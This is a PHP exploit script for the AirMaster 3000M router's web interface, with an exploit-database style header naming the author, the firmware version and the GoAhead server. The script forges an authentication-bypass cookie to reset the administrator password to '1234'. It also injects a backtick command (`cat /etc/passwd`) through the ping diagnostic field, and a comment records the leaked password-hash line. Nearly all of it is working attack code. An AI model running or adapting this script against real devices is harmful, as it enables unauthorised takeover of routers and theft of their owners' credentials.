<?php
# Exploit Title: AirMaster 3000M multiple Vulnerabilities
# Date: 2017/08/12
# Exploit Author: Koorosh Ghorbani
# Author Homepage: http://8thbit.net/
# Vendor Homepage: http://mobinnet.ir/
# Software Version: V2.0.1B1044
# Web Server: GoAhead-Webs/2.5.0

define('isDebug',false);
define('specialCookie','Cookie: kz_userid=Administrator:1'); //Special Cookie which allow us to execute commands without authentication
function changePassword(){
	$pw = "1234"; //New Password
	$data = "admuser=Administrator&admpass=$pw&admConfirmPwd=$pw" ;
	$ch = curl_init('http://192.168.1.1/goform/setSysAdm');
	curl_setopt($ch,CURLOPT_HTTPHEADER,array(
		specialCookie,
		'Origin: http://192.168.1.1',
		'Content-Type: application/x-www-form-urlencoded',
	));
	curl_setopt($ch,CURLOPT_POST,1);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
	$response = curl_exec($ch);
	if($response == "success"){
		echo "New Password is : $pw\r\n";
	}else{
		echo "Failed\r\n";
	}
	if (isDebug){
		echo $response;
	}
}
function executeCommand(){
	$data = "pingAddr=`cat /etc/passwd`";
	$ch = curl_init('http://192.168.1.1/goform/startPing');
	curl_setopt($ch,CURLOPT_HTTPHEADER,array(
		specialCookie,
		'Origin: http://192.168.1.1',
		'Content-Type: application/x-www-form-urlencoded',
		"X-Requested-With: XMLHttpRequest",
		"Referer: http://192.168.1.1/diagnosis_ping.asp"
	));
	curl_setopt($ch,CURLOPT_POST,1);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
	$response = curl_exec($ch);
	echo $response; //ping: bad address 'admin:XGUaznXz1ncKw:0:0:Adminstrator:/:/bin/sh'
}
changePassword();